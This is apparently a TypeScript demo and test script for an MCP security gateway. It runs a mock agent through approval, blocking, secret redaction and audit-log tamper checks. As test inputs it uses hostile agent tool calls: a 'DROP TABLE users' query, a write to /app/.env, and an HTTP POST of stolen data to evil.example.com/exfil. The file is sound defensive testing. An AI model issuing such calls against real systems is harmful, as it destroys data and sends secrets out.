import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { DownstreamManager } from "../src/proxy/downstream.js";
import { SecurityPipeline } from "../src/proxy/pipeline.js";
import { UpstreamServer } from "../src/proxy/upstream.js";
import { PolicyEngine } from "../src/policy/engine.js";
import { loadPolicyConfig } from "../src/config/load.js";
import { ApprovalQueue } from "../src/approval/queue.js";
import { AuditLogger } from "../src/audit/log.js";
import { verifyAuditLog } from "../src/audit/verify.js";
import {
  createMockServer,
  getExecutionCount,
  resetStats,
} from "../fixtures/mock-server/index.js";

export async function runDemoScenario(logFn = console.log) {
  logFn("\n=======================================================");
  logFn("🛡️  SUDARSHAN MCP GATEWAY - FULL DEMO SCENARIO (SEC 13)");
  logFn("=======================================================\n");

  resetStats();
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "sudarshan-demo-"));
  const approvalDir = path.join(tempDir, "approvals");
  const auditPath = path.join(tempDir, "audit.jsonl");

  const auditLogger = new AuditLogger(auditPath);
  const approvalQueue = new ApprovalQueue(approvalDir, 2);

  // 1. Mock downstream server
  const mockServer = createMockServer();
  const [mockClientTransport, mockServerTransport] = InMemoryTransport.createLinkedPair();
  await mockServer.connect(mockServerTransport);

  const mockClient = new Client({ name: "mock-client", version: "1.0.0" }, { capabilities: {} });
  await mockClient.connect(mockClientTransport);

  const downstreamManager = new DownstreamManager();
  downstreamManager.registerClient("mock", mockClient);

  // 2. Policy engine & Pipeline
  const policy = loadPolicyConfig("policy.yaml");
  const policyEngine = new PolicyEngine(policy);

  const pipeline = new SecurityPipeline(
    downstreamManager,
    policyEngine,
    approvalQueue,
    auditLogger,
    { agentId: "demo-agent", approvalTimeoutSeconds: 2 }
  );

  const upstream = new UpstreamServer(pipeline);
  const [agentTransport, upstreamTransport] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upstreamTransport);

  const agent = new Client({ name: "demo-agent", version: "1.0.0" }, { capabilities: {} });
  await agent.connect(agentTransport);

  try {
    // ----------------------------------------------------
    // Step 1: Agent calls mock.db_query with SELECT * FROM users -> allowed, logged
    // ----------------------------------------------------
    logFn("👉 Step 1: Agent calls mock.db_query with 'SELECT * FROM users'");
    const res1 = await agent.callTool({
      name: "mock.db_query",
      arguments: { sql: "SELECT * FROM users" },
    });
    logFn(`   Result: ${JSON.stringify(res1.content)} (isError: ${!!res1.isError})`);
    logFn(`   Downstream execution count: ${getExecutionCount("db_query")}`);
    if (res1.isError || getExecutionCount("db_query") !== 1) {
      throw new Error("Step 1 failed: Expected allowed query");
    }
    logFn("   ✅ Step 1 SUCCESS: Query allowed and executed downstream.\n");

    // ----------------------------------------------------
    // Step 2: Agent calls mock.db_query with DROP TABLE users -> held for approval -> Human denies -> mock count is 0
    // ----------------------------------------------------
    logFn("👉 Step 2: Agent calls mock.db_query with 'DROP TABLE users'");
    const beforeDropCount = getExecutionCount("db_query");
    const dropPromise = agent.callTool({
      name: "mock.db_query",
      arguments: { sql: "DROP TABLE users;" },
    });

    // Wait for pending approval request
    let pendingDrop = null;
    for (let i = 0; i < 20; i++) {
      const list = await approvalQueue.listPending();
      if (list.length > 0) {
        pendingDrop = list[0];
        break;
      }
      await new Promise((r) => setTimeout(r, 50));
    }
    if (!pendingDrop) throw new Error("Step 2 failed: Approval request not generated");

    logFn(`   Approval required: ID=${pendingDrop.id}, Risk=${pendingDrop.risk}`);
    logFn(`   Redacted args shown to human: ${JSON.stringify(pendingDrop.redactedArgs)}`);
    logFn("   👤 Human action: DENY");
    await approvalQueue.resolveRequest(pendingDrop.id, "denied", "human-controller");

    const res2 = await dropPromise;
    logFn(`   Result received by agent: ${JSON.stringify(res2.content)} (isError: ${res2.isError})`);
    const afterDropCount = getExecutionCount("db_query");
    logFn(`   Downstream execution count diff: ${afterDropCount - beforeDropCount}`);
    if (!res2.isError || afterDropCount !== beforeDropCount) {
      throw new Error("Step 2 failed: Denied call must not execute downstream");
    }
    logFn("   ✅ Step 2 SUCCESS: Destructive action denied, mock server was NEVER touched.\n");

    // ----------------------------------------------------
    // Step 3: Agent calls mock.fs_write with path /app/.env -> blocked immediately
    // ----------------------------------------------------
    logFn("👉 Step 3: Agent calls mock.fs_write with path '/app/.env'");
    const res3 = await agent.callTool({
      name: "mock.fs_write",
      arguments: { path: "/app/.env", content: "SECRET=123" },
    });
    logFn(`   Result received by agent: ${JSON.stringify(res3.content)} (isError: ${res3.isError})`);
    logFn(`   Downstream fs_write count: ${getExecutionCount("fs_write")}`);
    if (!res3.isError || getExecutionCount("fs_write") !== 0) {
      throw new Error("Step 3 failed: Secret file write must be blocked immediately");
    }
    logFn("   ✅ Step 3 SUCCESS: Write to .env blocked immediately.\n");

    // ----------------------------------------------------
    // Step 4: Agent calls mock.db_query with SELECT secret -> response redacted before agent
    // ----------------------------------------------------
    logFn("👉 Step 4: Agent calls mock.db_query with 'SELECT secret'");
    const res4 = await agent.callTool({
      name: "mock.db_query",
      arguments: { sql: "SELECT secret FROM credentials;" },
    });
    const content4 = res4.content[0] as { type: string; text: string };
    logFn(`   Result text received by agent: "${content4.text}"`);
    if (content4.text.includes("AKIAIOSFODNN7EXAMPLE")) {
      throw new Error("Step 4 failed: Raw AWS key leaked to agent!");
    }
    if (!content4.text.includes("[REDACTED:aws_access_key]")) {
      throw new Error("Step 4 failed: Redacted placeholder missing");
    }
    logFn("   ✅ Step 4 SUCCESS: Fake AWS key redacted from response before reaching agent.\n");

    // ----------------------------------------------------
    // Step 5: Agent calls mock.http_post to https://evil.example.com -> approval required
    // ----------------------------------------------------
    logFn("👉 Step 5: Agent calls mock.http_post to 'https://evil.example.com'");
    const httpPromise = agent.callTool({
      name: "mock.http_post",
      arguments: { url: "https://evil.example.com/exfil", body: '{"stolen":true}' },
    });

    let pendingHttp = null;
    for (let i = 0; i < 20; i++) {
      const list = await approvalQueue.listPending();
      if (list.length > 0) {
        pendingHttp = list[0];
        break;
      }
      await new Promise((r) => setTimeout(r, 50));
    }
    if (!pendingHttp) throw new Error("Step 5 failed: Approval request for external HTTP not generated");
    logFn(`   Approval held: ID=${pendingHttp.id}, Tool=${pendingHttp.tool}, Risk=${pendingHttp.risk}`);
    await approvalQueue.resolveRequest(pendingHttp.id, "approved", "admin");
    const res5 = await httpPromise;
    logFn(`   Result after approval: ${JSON.stringify(res5.content)}`);
    if (res5.isError || getExecutionCount("http_post") !== 1) {
      throw new Error("Step 5 failed: Approved HTTP post did not execute");
    }
    logFn("   ✅ Step 5 SUCCESS: External HTTP caught for approval and executed upon authorization.\n");

    // ----------------------------------------------------
    // Step 6: sudarshan-audit verify prints OK; after tampering one line, reports broken line
    // ----------------------------------------------------
    logFn("👉 Step 6: Audit log chain verification and tampering test");
    const initialVerify = verifyAuditLog(auditPath);
    logFn(`   Initial verification: Valid=${initialVerify.valid}, Total Entries=${initialVerify.totalEntries}`);
    if (!initialVerify.valid) {
      throw new Error("Step 6 failed: Initial audit log verification failed");
    }

    // Tamper with line 2 (tampering an argument in the audit entry)
    const rawContent = fs.readFileSync(auditPath, "utf-8");
    const lines = rawContent.split(/\r?\n/).filter(Boolean);
    const parsedLine2 = JSON.parse(lines[1]);
    parsedLine2.args_redacted = { tampered: true }; // modified content without recalculating hash
    lines[1] = JSON.stringify(parsedLine2);
    fs.writeFileSync(auditPath, lines.join("\n") + "\n", "utf-8");

    const tamperedVerify = verifyAuditLog(auditPath);
    logFn(`   Verification after tampering: Valid=${tamperedVerify.valid}, Broken Seq=${tamperedVerify.brokenSeq}`);
    logFn(`   Tamper reason: ${tamperedVerify.reason}`);
    if (tamperedVerify.valid || tamperedVerify.brokenSeq !== 2) {
      throw new Error(`Step 6 failed: Tamper at line 2 was not caught! (brokenSeq: ${tamperedVerify.brokenSeq})`);
    }
    logFn("   ✅ Step 6 SUCCESS: Audit log integrity verified, and manual tampering instantly caught at Seq 2!\n");

    logFn("=======================================================");
    logFn("🎉 ALL 6 DEMO SCENARIOS COMPLETED AND VERIFIED 100%!");
    logFn("=======================================================\n");
  } finally {
    await agent.close();
    await upstream.close();
    await downstreamManager.stop();
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  }
}

// When run via "npm run demo" or "tsx test/demo.ts"
if (process.argv[1] && process.argv[1].replace(/\\/g, "/").endsWith("test/demo.ts")) {
  runDemoScenario().catch((err) => {
    console.error("Demo failed:", err);
    process.exit(1);
  });
}
